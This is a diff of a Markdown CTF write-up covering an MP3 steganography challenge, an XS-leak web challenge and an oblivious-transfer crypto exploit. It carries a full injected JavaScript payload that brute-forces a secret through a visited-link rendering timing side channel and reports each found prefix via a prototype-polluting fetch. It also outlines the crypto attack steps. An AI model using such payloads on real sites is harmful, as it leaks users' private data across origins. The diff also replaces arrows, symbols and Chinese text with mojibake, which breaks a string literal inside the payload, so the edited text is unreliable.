@@ -969,7 +969,7 @@ QmU0r9nN.(*N28oOOYGUkH).EncodeBufferInterleaved
 
 The flag is **not** stored directly in audio data. The pipeline is:
 
-flag → AES-CTR encryption → custom expansion encoding → embedded into MP3 frame side-info (main_data_begin)
+flag �?AES-CTR encryption �?custom expansion encoding �?embedded into MP3 frame side-info (main_data_begin)
 
 For each MP3 frame, the hidden value is:
 
@@ -1635,7 +1635,7 @@ if __name__ == "__main__":
     main()
 ```
 
-![](../img/TRXCTF/web1.png)
+![](/img/TRXCTF/web1.png)
 
 ## web/are xsleaks dead?
 
@@ -1661,7 +1661,7 @@ driver.get(BASE_URL)          # remote 上是内部 http://web:8000/
 # 写入 FLAG
 driver.switch_to.new_window("tab")
 driver.close()                # 关闭 notes tab
-driver.get(report_url)        # 访问攻击页
+driver.get(report_url)        # 访问攻击�?
 time.sleep(300)
 ```
 
@@ -1763,7 +1763,7 @@ def main():
     key = "k" + rnd()
     title = "x" + rnd(5)
 
-    js = f"""function nav(u){{location=u}}const B='http://web:8000/';const A='abcdefghijklmnopqrstuvwxyz0123456789_';const K='{key}';const P0='{args.prefix}';const N=300;const C=3;const CU=location.href.split('#')[0]+'#child';var st,links;if(location.hash!='#child'){{document.body.innerHTML='<div id=box></div>';let S=document.createElement('style');S.textContent='body{{background:white;margin:0}}#box{{width:780px;height:440px;overflow:hidden}}.probe{{transform:perspective(100px) rotateY(37deg);filter:contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%);text-shadow:16px 16px 10px #fefffe;outline:24px solid white;font-size:2px;text-align:center;display:inline-block;color:white;background-color:white;outline-color:white;width:2px;height:2px;margin:0;padding:0}}.probe:visited{{color:#feffff;background-color:#fffeff;outline-color:#fffffe}}';document.head.appendChild(S);st=JSON.parse(localStorage[K]||'{{}}');if(!st.p)st={{p:P0,i:0,t:0,cal:0}};const TEXT='一丁丂七丄丅丆万'.repeat(4);for(let i=0;i<N;i++){{let a=document.createElement('a');a.className='probe';a.textContent=TEXT;a.href='http://dummy.invalid/'+Math.random();box.appendChild(a)}}links=[...document.querySelectorAll('a.probe')];setTimeout(mainf,100)}}function delay(ms){{return new Promise(r=>setTimeout(r,ms))}}function nf(){{return new Promise(r=>requestAnimationFrame(()=>r()))}}function send(x){{fetch('/notes?__proto__%5Bsuffix%5D='+encodeURIComponent(x)).catch(e=>{{}})}}async function waitchild(w){{for(let i=0;i<100;i++){{try{{if(w.nav)return}}catch(e){{}}await delay(10)}}throw Error('nochild')}}async function visit(u){{let w=open(CU,'c'+Math.random());await waitchild(w);w.nav(u);for(let i=0;i<150;i++){{try{{void w.document.body}}catch(e){{break}}await delay(3)}}try{{w.close()}}catch(e){{}}await delay(20)}}async function settle(h){{for(const a of links)a.href=h;await nf();await nf();await delay(15);await nf()}}async function measure(u){{const d1='http://dummy.invalid/'+Math.random(),d2='http://dummy.invalid/'+Math.random();await settle(d1);let t0=performance.now();for(let i=0;i<C;i++){{let h=(i&1)?d2:u;for(const a of links)a.href=h;await nf()}}let dt=performance.now()-t0;await settle(d1);return dt}}async function score(u){{let d=await measure(u);if(d>st.t){{let e=await measure(u);return Math.min(d,e)}}return d}}async function score3(u){{let a=[];for(let i=0;i<3;i++)a.push(await measure(u));return Math.min(...a)}}function url(q){{return B+'?q='+encodeURIComponent(q)+'&r='+Math.random()}}async function mainf(){{try{{if(!st.cal){{let h=url('TRX{{'),m=url('zzzz_cal_'+Math.random());await visit(h);await visit(m);let md=await score3(m);let hd=await score3(h);st.t=(md+hd)/2;st.cal=1;localStorage[K]=JSON.stringify(st);send('cal:'+Math.round(md)+','+Math.round(hd)+',p:'+st.p);await delay(800);location.reload();return}}send('start:'+st.p+':i'+st.i+':t'+Math.round(st.t));while(st.p.length<34){{for(;st.i<A.length;st.i++){{let ch=A[st.i],u=url(st.p+ch);await visit(u);let d=await score(u);if(d>st.t){{st.p+=ch;st.i=0;localStorage[K]=JSON.stringify(st);send('pref:'+st.p);await delay(900);location.reload();return}}}}send('fail:'+st.p);return}}send('flag:'+st.p+'}}')}}catch(e){{send('err:'+e.stack)}}}}"""
+    js = f"""function nav(u){{location=u}}const B='http://web:8000/';const A='abcdefghijklmnopqrstuvwxyz0123456789_';const K='{key}';const P0='{args.prefix}';const N=300;const C=3;const CU=location.href.split('#')[0]+'#child';var st,links;if(location.hash!='#child'){{document.body.innerHTML='<div id=box></div>';let S=document.createElement('style');S.textContent='body{{background:white;margin:0}}#box{{width:780px;height:440px;overflow:hidden}}.probe{{transform:perspective(100px) rotateY(37deg);filter:contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%);text-shadow:16px 16px 10px #fefffe;outline:24px solid white;font-size:2px;text-align:center;display:inline-block;color:white;background-color:white;outline-color:white;width:2px;height:2px;margin:0;padding:0}}.probe:visited{{color:#feffff;background-color:#fffeff;outline-color:#fffffe}}';document.head.appendChild(S);st=JSON.parse(localStorage[K]||'{{}}');if(!st.p)st={{p:P0,i:0,t:0,cal:0}};const TEXT='一丁丂七丄丅丆�?.repeat(4);for(let i=0;i<N;i++){{let a=document.createElement('a');a.className='probe';a.textContent=TEXT;a.href='http://dummy.invalid/'+Math.random();box.appendChild(a)}}links=[...document.querySelectorAll('a.probe')];setTimeout(mainf,100)}}function delay(ms){{return new Promise(r=>setTimeout(r,ms))}}function nf(){{return new Promise(r=>requestAnimationFrame(()=>r()))}}function send(x){{fetch('/notes?__proto__%5Bsuffix%5D='+encodeURIComponent(x)).catch(e=>{{}})}}async function waitchild(w){{for(let i=0;i<100;i++){{try{{if(w.nav)return}}catch(e){{}}await delay(10)}}throw Error('nochild')}}async function visit(u){{let w=open(CU,'c'+Math.random());await waitchild(w);w.nav(u);for(let i=0;i<150;i++){{try{{void w.document.body}}catch(e){{break}}await delay(3)}}try{{w.close()}}catch(e){{}}await delay(20)}}async function settle(h){{for(const a of links)a.href=h;await nf();await nf();await delay(15);await nf()}}async function measure(u){{const d1='http://dummy.invalid/'+Math.random(),d2='http://dummy.invalid/'+Math.random();await settle(d1);let t0=performance.now();for(let i=0;i<C;i++){{let h=(i&1)?d2:u;for(const a of links)a.href=h;await nf()}}let dt=performance.now()-t0;await settle(d1);return dt}}async function score(u){{let d=await measure(u);if(d>st.t){{let e=await measure(u);return Math.min(d,e)}}return d}}async function score3(u){{let a=[];for(let i=0;i<3;i++)a.push(await measure(u));return Math.min(...a)}}function url(q){{return B+'?q='+encodeURIComponent(q)+'&r='+Math.random()}}async function mainf(){{try{{if(!st.cal){{let h=url('TRX{{'),m=url('zzzz_cal_'+Math.random());await visit(h);await visit(m);let md=await score3(m);let hd=await score3(h);st.t=(md+hd)/2;st.cal=1;localStorage[K]=JSON.stringify(st);send('cal:'+Math.round(md)+','+Math.round(hd)+',p:'+st.p);await delay(800);location.reload();return}}send('start:'+st.p+':i'+st.i+':t'+Math.round(st.t));while(st.p.length<34){{for(;st.i<A.length;st.i++){{let ch=A[st.i],u=url(st.p+ch);await visit(u);let d=await score(u);if(d>st.t){{st.p+=ch;st.i=0;localStorage[K]=JSON.stringify(st);send('pref:'+st.p);await delay(900);location.reload();return}}}}send('fail:'+st.p);return}}send('flag:'+st.p+'}}')}}catch(e){{send('err:'+e.stack)}}}}"""
 
     payload = "<script>" + js + "</script>"
     assert '"' not in payload and "\n" not in payload
@@ -2420,14 +2420,14 @@ parity(s∩interval)
 
 ### Exploit
 
-1. In base OT, send `(k0, k1) = (0, 0)` → full control over extension input
+1. In base OT, send `(k0, k1) = (0, 0)` �?full control over extension input
 2. Use interval-shaped Ei
 3. During consistency check:
    1. Decompose wE into codeword + residual
    2. Put codeword part into `alpha`
    3. Guess residual parity
 4. Use abort oracle to retry
-   1. Success probability ≈ 2−12
+   1. Success probability �?2�?2
 5. Recover Flag
    1. Obtain parity of each interval
    2. Reconstruct full s by enumeration
